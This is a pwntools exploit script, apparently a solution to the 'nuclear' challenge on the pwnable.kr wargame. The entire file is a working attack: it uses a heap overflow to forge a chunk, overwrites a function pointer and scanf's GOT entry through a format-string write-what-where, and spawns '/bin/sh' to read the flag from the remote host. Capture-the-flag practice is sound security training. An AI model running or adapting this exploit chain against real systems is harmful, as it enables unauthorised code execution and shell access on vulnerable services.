#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ template template --host pwnable.kr --port 9013 ./nuclear
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF("./nuclear")

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or "pwnable.kr"
port = int(args.PORT or 9013)


def start_local(argv=[], *a, **kw):
    """Execute the target binary locally"""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    """Connect to the process on the remote host"""
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
set follow-fork-mode parent
continue
""".format(
    **locals()
)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

HELP = 1
NUKE = 2
EXIT = 3

context.terminal = ["kitty"]


def do_menu(io: tube, choice):
    io.sendlineafter(b"> ", str(choice).encode())


def allocate_buf(io: tube, data: bytes):
    assert not set("\x00\n") & set(data)
    do_menu(io, EXIT)
    io.sendline(data)


def heap_overflow(io: tube):
    do_menu(io, NUKE)
    io.sendline(b"0" * (992) + b"14")


context.terminal = ["kitty"]

TARGET_ADDR = exe.plt["__isoc99_scanf"]

WHAT = 0x400B64  # just before the system in `nuke`. uses a local stack buffer as command which is good for us since we control the stack by spcifying the url
WHERE = exe.got["__isoc99_scanf"]

io = start()

# OVERWRITE FUNCTION TABLE
info(f"overwriting function table (nuke -> 0x{TARGET_ADDR:x})")

# temp buf - needed since the fake chunk header is two 0x3000 allocations away
allocate_buf(io, b"n")

# fake chunk header buf
allocate_buf(io, flat({8: b"\x30"}))

# overwrite next chunk header (set as free)
heap_overflow(io)

# allocate chunk over function table and overwrite function pointer
allocate_buf(io, flat({1016: TARGET_ADDR}))

# WRITE WHAT WHERE
# write what where using the overwritten function pointer
info(f"write what where (scanf (0x{WHAT:x}) -> ~system (0x{WHERE:x}))")

do_menu(io, NUKE)

# there is a stack address (the one at offset 295*8) at offset 269*8 of the stack
# by overwriting it we get another stack address (the address which it points to)
# which points to our chosen address. writing to this offset now gives write what where
io.sendline(flat({0: b"%269$llu-%295$llu", 1920: b"/bin/sh\x00"}))
io.sendline(f"{WHERE}-{WHAT}".encode())

# jump to system
info("jumping to shell")
do_menu(io, NUKE)

io.sendline(b"echo marker; cat flag")
io.recvuntil(b"marker\n")

success(f"flag = '{term.text.bold_italic_yellow(io.recvline().decode().strip())}'")
